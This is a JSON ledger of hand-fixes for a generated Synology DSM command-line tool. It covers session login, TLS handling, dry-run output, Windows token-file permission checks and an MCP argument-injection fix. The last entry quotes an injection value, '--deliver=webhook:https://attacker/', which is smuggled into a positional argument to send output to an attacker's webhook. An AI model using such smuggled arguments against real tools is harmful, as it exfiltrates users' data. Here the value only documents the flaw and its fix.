@@ -1,0 +1,404 @@
+{
+  "slug": "synology",
+  "doc": "docs/reprint-survival.md",
+  "handfixes": [
+    {
+      "id": "dsm-session-login",
+      "summary": "Session handshake performs a real SYNO.API.Auth login (form POST) from config/env credentials, one session file per NAS shared with the fleet device-token cache, bound to the account and the full origin (a sid cached for https:// is never sent to http://), keeping the SynoToken and 2FA trusted-device token; the per-account trusted-device tokens the fleet layer keeps in the same file survive every write; an expired session clears only the rejected sid; a TLS pin over http:// refuses to log in; a refused configuration (address with a user or password, the example placeholder address, a pin over http://) sends nothing; each request carries an atomic sid+SynoToken snapshot",
+      "why": "The generic session_handshake template GETs a static token URL with no credentials; DSM needs an account login, returns sid + synotoken + did, and DSM 7.3.2+ rejects calls without X-SYNO-TOKEN. A regenerated session.go silently sends every request without a session (DSM error 119).",
+      "status": "active",
+      "spec_encode_followup": "press support for credential-bearing session logins (form POST with auth_flow_input env vars) in session_handshake",
+      "asserts": [
+        {
+          "file": "cli/internal/client/session.go",
+          "contains": "HAND-FIX(dsm-login)",
+          "min_count": 17
+        },
+        {
+          "file": "cli/internal/client/session.go",
+          "contains": "dsm.Login(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "sess.ConfigureDSM(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "\"X-SYNO-TOKEN\"",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/session.go",
+          "contains": "dsm.SessionFileName(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/session.go",
+          "contains": "rec.Account != m.creds.Account",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/session.go",
+          "contains": "dsm.WriteSessionRecord(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/session.go",
+          "contains": "dsm.CachedDeviceIDFile(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/session.go",
+          "contains": "func (m *SessionManager) InvalidateSID(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/session.go",
+          "contains": "func (m *SessionManager) Snapshot()",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/session.go",
+          "contains": "dsm.CheckOrigin(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/session.go",
+          "contains": "func (m *SessionManager) EnsureSnapshot()",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/session.go",
+          "contains": "func (m *SessionManager) Refused()",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/session.go",
+          "contains": "dsm.PlaceholderOrigin(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "c.Session.EnsureSnapshot()",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "c.Session.Refused()",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "key += \"|dsm_account=\"",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "HTML document (%d bytes; content not shown)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/session.go",
+          "contains": "m.creds.OTPCode = \"\"",
+          "min_count": 1,
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "dsm-envelope",
+      "summary": "HTTP 200 {success:false} becomes an APIError with the DSM error text; relogin once on an expired session; {success:true,data} is unwrapped; a DSM read that comes back without a {success:true,data} envelope is an error",
+      "why": "DSM reports every failure as HTTP 200. Without this a failed call prints the error envelope as if it were data and exits 0 (false green).",
+      "status": "active",
+      "asserts": [
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "HAND-FIX(dsm-envelope)",
+          "min_count": 1
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "dsm.Envelope(respBody)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "c.Session.InvalidateSID(authHeader)",
+          "min_count": 2,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "Body: \"DSM answered without a data envelope\"",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "&& !strings.Contains(path, \"/webapi/\") {",
+          "min_count": 1,
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "dsm-tls",
+      "summary": "SYNOLOGY_TLS_FINGERPRINT pins and SYNOLOGY_SKIP_TLS_VERIFY skips TLS verification on the standard transport; a redirect to another origin is refused outright (Go copies the sid-bearing URL into Referer before CheckRedirect runs)",
+      "why": "Most NAS units serve DSM's self-signed certificate. Only the h2-only browser-chrome transport emits --insecure, and that transport cannot reach DSM over plain HTTP or with HTTP/2 off (DSM's default).",
+      "status": "active",
+      "asserts": [
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "dsm.EnvTLS()",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "return dsm.ErrRedirectRefused",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "if dsm.SameOriginRedirect(req, via) != nil {",
+          "min_count": 1,
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "dsm-auth-login",
+      "summary": "auth login performs the DSM login and caches the session instead of importing browser cookies for the spec's placeholder host",
+      "why": "The generated auth login imported cookies for https://nas.example.com:5001 (the spec placeholder), so it could never authenticate a real NAS.",
+      "status": "active",
+      "asserts": [
+        {
+          "file": "cli/internal/cli/auth.go",
+          "contains": "HAND-FIX(dsm-auth-login)",
+          "min_count": 1
+        },
+        {
+          "file": "cli/internal/cli/auth.go",
+          "not_contains": "ImportSession(\"https://nas.example.com"
+        },
+        {
+          "file": "cli/internal/cli/auth.go",
+          "contains": "dsm.Origin(cfg.BaseURL)",
+          "min_count": 2,
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "session-auth-tests",
+      "summary": "Three generated credentials tests that assert access_token precedence are skipped",
+      "why": "Session-handshake auth never reads access_token into AuthHeader; the generated assertions do not apply and fail.",
+      "status": "active",
+      "asserts": [
+        {
+          "file": "cli/internal/cliutil/credentials_test.go",
+          "contains": "HAND-FIX(session-auth-tests)",
+          "min_count": 3
+        }
+      ]
+    },
+    {
+      "id": "dsm-dry-run",
+      "summary": "abb backup, abb cancel and session logout (DSM write calls are GETs on entry.cgi) answer --dry-run with the standard {dry_run:true, action} object via writeDryRun; nothing is sent",
+      "why": "The generated GET-mutation template wraps the client's dry-run sentinel in the provenance envelope ({meta, results:{dry_run:true}}), which fails the live dogfood dry-run JSON contract (missing top-level dry_run:true) and so the Phase 5 gate.",
+      "status": "active",
+      "spec_encode_followup": "press: give GET-shaped mutations (RPC APIs) the same dry-run short-circuit as POST mutations",
+      "asserts": [
+        {
+          "file": "cli/internal/cli/abb_backup.go",
+          "contains": "HAND-FIX(dsm-dry-run)",
+          "min_count": 1
+        },
+        {
+          "file": "cli/internal/cli/abb_cancel.go",
+          "contains": "HAND-FIX(dsm-dry-run)",
+          "min_count": 1
+        },
+        {
+          "file": "cli/internal/cli/session_logout.go",
+          "contains": "HAND-FIX(dsm-dry-run)",
+          "min_count": 1
+        }
+      ]
+    },
+    {
+      "id": "dsm-auth-logout",
+      "summary": "auth logout also forgets the cached DSM session (sid, SynoToken) and the account's trusted-device token for the configured NAS",
+      "why": "The generated logout clears config credentials only; the per-origin session file kept a reusable sid, so a later command still authenticated after 'credentials cleared'.",
+      "status": "active",
+      "asserts": [
+        {
+          "file": "cli/internal/cli/auth.go",
+          "contains": "HAND-FIX(dsm-auth-logout)",
+          "min_count": 2
+        },
+        {
+          "file": "cli/internal/cli/auth.go",
+          "contains": "dsm.ForgetSession(",
+          "min_count": 1,
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "windows-sddl-alias-sid-compare",
+      "summary": "the Windows token-file guard compares trustees by SID, resolving SDDL aliases through the OS, so the built-in Administrator (RID 500, rendered as LA) can save and load credentials",
+      "why": "Press 4.30.2+ creds_perms_eval.go compared the SDDL text of the token file's owner and ACE trustees against the process's SID string. The SDDL converter renders the built-in local Administrator (RID 500) as the alias LA, so that account's own ACE never matched: `auth set-token` exited 1 with `token file DACL grants access to a non-owner principal (LA)` and every read refused the file. Reproduced 2026-10-15 on the published fortinet-cli 0.1.0, installed with the README one-liner on a windows-latest runner (whoami S-1-5-21-...-500). The fix resolves each trustee to its SID (fixed aliases from a table, machine-relative ones like LA through ConvertStringSidToSid, kept only when the converter renders that SID back to the same alias) and compares SIDs. The allow-list is unchanged (current user, BUILTIN\\Administrators, SYSTEM): an owner or allow-ACE trustee that is any other principal, a broad group, or unresolvable is still refused. A reprint from an unfixed press silently restores the string compare while unit tests stay green on every non-Windows host.",
+      "status": "active",
+      "spec_encode_followup": "Press defect in internal/generator/templates/cliutil_creds_perms_eval.go.tmpl and cliutil_creds_perms_windows.go.tmpl (unfixed on press main as of 4.33.5). Reported upstream: https://github.com/mvanhorn/cli-printing-press/issues/5029",
+      "asserts": [
+        {
+          "file": "cli/internal/cliutil/creds_perms_eval.go",
+          "contains": "func trusteeSID(trustee string, resolveAlias sddlAliasResolver) string {",
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/creds_perms_eval.go",
+          "contains": "if om == nil || !sidAllowed(trusteeSID(om[1], resolveAlias), currentUserSID) {",
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/creds_perms_eval.go",
+          "contains": "if !sidAllowed(trusteeSID(trustee, resolveAlias), currentUserSID) {",
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/creds_perms_windows.go",
+          "contains": "return evalCredsSecurityResolved(sd.String(), me, resolveSDDLAlias)",
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/creds_perms_windows.go",
+          "contains": "sid, err := windows.StringToSid(alias)",
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/creds_perms_windows.go",
+          "not_contains": "return evalCredsSecurity(sd.String(), me)"
+        },
+        {
+          "file": "cli/internal/cliutil/creds_perms_sddl_test.go",
+          "contains": "func TestEvalCredsSecurityResolvesSDDLAliases(t *testing.T) {",
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "windows-null-dacl-behind-flags",
+      "summary": "the Windows token-file guard checks the DACL section's framing, so a NULL DACL is refused in the form Windows actually renders it, flags first (D:PAINO_ACCESS_CONTROL), and DACL text that does not frame as flags plus complete six-field ACEs is refused rather than skipped",
+      "why": "Press creds_perms_eval.go refused a NULL DACL only when the DACL section began with NO_ACCESS_CONTROL. SDDL puts DACL flags (P, AI, AR) first, and a real NULL DACL on Windows Server 2025 renders as O:<owner>D:PAINO_ACCESS_CONTROL (measured on a windows-latest runner, 2026-10-15), so the guard found no ACEs to inspect and accepted a world-accessible token file. That was already a hole for every ordinary account; for the built-in Administrator the owner-alias mismatch happened to refuse it, so resolving LA (windows-sddl-alias-sid-compare) without this fix would have widened the hole. The DACL section's framing is now checked: its flags must be drawn from P/AI/AR/NO_ACCESS_CONTROL, an empty DACL followed by a SACL section ends at that section, and the ACE list must be complete, un-nested (...) groups of exactly six fields. Unknown flags, an unclosed or nested group, stray text, or a wrong field count is refused (fail-closed). ACE flags and rights are not validated; they do not change which principal an allow ACE names.",
+      "status": "active",
+      "spec_encode_followup": "Same press templates as windows-sddl-alias-sid-compare; reported in the same upstream issue: https://github.com/mvanhorn/cli-printing-press/issues/5029",
+      "asserts": [
+        {
+          "file": "cli/internal/cliutil/creds_perms_eval.go",
+          "contains": "if strings.Contains(daclFlags, \"NO_ACCESS_CONTROL\") {",
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/creds_perms_eval.go",
+          "contains": "if !daclFlagsRe.MatchString(daclFlags) {",
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/creds_perms_eval.go",
+          "contains": "if !aceListRe.MatchString(rest[flagsEnd:]) {",
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/creds_perms_eval.go",
+          "contains": "if len(fields) != 6 {",
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/creds_perms_eval.go",
+          "not_contains": "if strings.HasPrefix(rest, \"NO_ACCESS_CONTROL\") {"
+        },
+        {
+          "file": "cli/internal/cliutil/creds_perms_sddl_test.go",
+          "contains": "func TestEvalCredsSecurityRefusesNullDACLBehindFlags(t *testing.T) {",
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/creds_perms_sddl_test.go",
+          "contains": "func TestEvalCredsSecurityChecksTheDACLSectionFraming(t *testing.T) {",
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "mcp-recipe-argv-not-flag-like",
+      "summary": "Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag now always emits one --name=value element (the useEquals=false split branch is gone), and every appendRecipePositional call site first runs rejectFlagLikeRecipeValue, which refuses a positional value beginning with '-' (except the bare '-') before the CLI runs. (1 guarded call site(s); the ledger requires all of them.)",
+      "why": "Found by Codex adversarial review of the fleet mcp-argv-value-joined backport (2026-09-09): the recipe path had the same key-only gap. A recipe positional is appended to argv AHEAD of the recipe's own flags, so {\"domain\": \"--deliver=webhook:https://attacker/\"} became `exceptions find --deliver=webhook:... --agent` and pflag parsed the value as the denylisted root flag (and {\"domain\": \"--dry-run\"} demonstrably changed execution). The split appendRecipeStringFlag branch was safe only because its one caller's flag is a string flag that consumes the next token; a future NoOptDefVal flag would reopen it. Upstream cli-printing-press be378adf (#4647) fixed cliArgsFromMCP but NOT this recipe path, so a reprint REINTRODUCES it while go build and go test stay green; this entry is what notices. Mirrors cobratree.validatePositionalArgsForMCP, which already applies this rule to the raw args field. Retire only when the press generator refuses flag-like recipe positionals itself. Synology: the abb triage recipe (MCP tool why_did_a_task_fail) appended input[\"value\"] as a positional with no check; proven both directions on 2026-10-20 (guard removed: `abb triage --deliver=webhook:https://x/ --agent` reached the CLI; guard present: refused before the CLI runs).",
+      "status": "active",
+      "asserts": [
+        {
+          "file": "cli/internal/mcp/intents.go",
+          "contains": "return append(args, \"--\"+name+\"=\"+selected), false",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/mcp/intents.go",
+          "not_contains": "\"--\"+name, selected"
+        },
+        {
+          "file": "cli/internal/mcp/intents.go",
+          "contains": "func rejectFlagLikeRecipeValue(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/mcp/intents.go",
+          "contains": "if err := rejectFlagLikeRecipeValue(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/mcp/recipe_intents_test.go",
+          "contains": "RejectsFlagLikePositional(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/mcp/intents.go",
+          "contains": "if s := recipeValueString(value); s != \"-\" && strings.HasPrefix(s, \"-\") {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/mcp/recipe_intents_test.go",
+          "contains": "func TestRejectFlagLikeRecipeValueEdges(",
+          "min_count": 1,
+          "code_only": true
+        }
+      ]
+    }
+  ]
+}
